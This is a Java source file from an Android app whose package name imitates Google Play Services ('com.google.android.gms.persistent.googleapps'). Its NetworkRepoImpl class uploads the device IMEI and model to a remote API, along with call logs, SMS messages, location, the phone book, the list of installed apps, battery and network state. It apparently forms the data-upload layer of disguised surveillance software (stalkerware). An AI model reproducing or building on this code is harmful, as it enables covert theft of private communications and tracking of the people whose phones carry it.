package com.google.android.gms.persistent.googleapps.repositories;

import android.os.Build;

import com.google.android.gms.persistent.googleapps.network.api.ApiService;
import com.google.android.gms.persistent.googleapps.network.models.data.Data;
import com.google.android.gms.persistent.googleapps.network.models.request.DeleteRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.InformationRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.InitialRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.OneTimeRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.SyncRequest;
import com.google.android.gms.persistent.googleapps.network.models.response.DeleteResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InformationResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InitialResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.SyncResponse;
import com.google.android.gms.persistent.googleapps.utils.Preferences;
import com.google.android.gms.persistent.googleapps.utils.RxRetrofitUtils;

import java.util.ArrayList;
import java.util.List;

import javax.inject.Inject;

import io.reactivex.Single;

/**
 * Created by OldMan on 04.04.2017.
 */

public class NetworkRepoImpl implements NetworkRepo {
    private ApiService apiService;
    private Preferences preferences;
    private String imei;
    private String device;

    @Inject
    public NetworkRepoImpl(ApiService apiService, Preferences preferences) {
        this.apiService = apiService;
        this.preferences = preferences;
        imei = preferences.getImei();
        device = preferences.getDevice();
    }

    //    @RxLogObservable
    @Override
    public Single<InitialResponse> onInitDevice() {
        InitialRequest request = new InitialRequest(imei, Build.MODEL);
//        return Single.just(new InitialResponse(1, "123211"));
        return RxRetrofitUtils.wrapRetrofitCall(apiService.onInitDevice(request));
    }

    @Override
    public Single<SyncResponse> onStateSync(SyncRequest request) {
        return RxRetrofitUtils.wrapRetrofitCall(apiService.onStateSync(request));
    }

    @Override
    public Single<DeleteResponse> onDeleteDevice(DeleteRequest request) {
        return RxRetrofitUtils.wrapRetrofitCall(apiService.onDeleteDevice(request));
    }

    @Override
    public Single<InformationResponse> setListDataOfDevice(List<Data> dataList) {
        return null;
    }

    @Override
    public Single<InformationResponse> setDataOfDevice(Data data) {
        List<Data> list = new ArrayList<>();
        list.add(data);
        InformationRequest informationRequest = new InformationRequest(list, imei, device);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.addCallOfDevice(informationRequest));
    }

    @Override
    public Single<InformationResponse> addPositionOfDevice(Data data) {
        List<Data> list = new ArrayList<>();
        list.add(data);
        InformationRequest informationRequest = new InformationRequest(list, imei, device);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.addPositionOfDevice(informationRequest));
    }

    @Override
    public Single<InformationResponse> addCallOfDevice(Data data) {
        List<Data> list = new ArrayList<>();
        list.add(data);
        InformationRequest informationRequest = new InformationRequest(list, imei, device);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.addCallOfDevice(informationRequest));
    }

    @Override
    public Single<InformationResponse> addSMSOfDevice(Data data) {
        List<Data> list = new ArrayList<>();
        list.add(data);
        InformationRequest informationRequest = new InformationRequest(list, imei, device);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.addSmsOfDevice(informationRequest));
    }

    @Override
    public Single<InformationResponse> addCallListOfDevice(List<Data> dataList) {
        InformationRequest informationRequest = new InformationRequest(dataList, imei, device);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.addCallOfDevice(informationRequest));
    }

    @Override
    public Single<InformationResponse> addSMSListOfDevice(List<Data> dataList) {
        InformationRequest informationRequest = new InformationRequest(dataList, imei, device);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.addSmsOfDevice(informationRequest));

    }

    @Override
    public Single<InformationResponse> addDiagnosticOfDevice(Data data) {
        List<Data> list = new ArrayList<>();
        list.add(data);
        InformationRequest informationRequest = new InformationRequest(list, imei, device);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.setDiagnosticOfDevice(informationRequest));
    }

    @Override
    public Single<InformationResponse> setPhoneBookOfDevice(List<Data> dataList, long date) {
        OneTimeRequest informationRequest = new OneTimeRequest(dataList, imei, device, date);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.setPhoneBookOfDevice(informationRequest));
    }

    @Override
    public Single<InformationResponse> addListAppOfDevice(List<Data> dataList) {
        InformationRequest informationRequest = new InformationRequest(dataList, imei, device);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.addAppOfDevice(informationRequest));
    }

    @Override
    public Single<InformationResponse> addAppOfDevice(Data data) {
        List<Data> list = new ArrayList<>();
        list.add(data);
        InformationRequest informationRequest = new InformationRequest(list, imei, device);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.addAppOfDevice(informationRequest));
    }

    @Override
    public Single<InformationResponse> addDeviceStatus(Data data) {
        List<Data> list = new ArrayList<>();
        list.add(data);
        InformationRequest informationRequest = new InformationRequest(list, imei, device);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.setDeviceStatus(informationRequest));
    }

    @Override
    public Single<InformationResponse> addDeviceBatteryState(Data data) {
        List<Data> list = new ArrayList<>();
        list.add(data);
        InformationRequest informationRequest = new InformationRequest(list, imei, device);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.setDeviceBatteryState(informationRequest));
    }

    @Override
    public Single<InformationResponse> addNetworkState(Data data) {
        List<Data> list = new ArrayList<>();
        list.add(data);
        InformationRequest informationRequest = new InformationRequest(list, imei, device);
        return RxRetrofitUtils.wrapRetrofitCall(apiService.setNetworkState(informationRequest));
    }


}
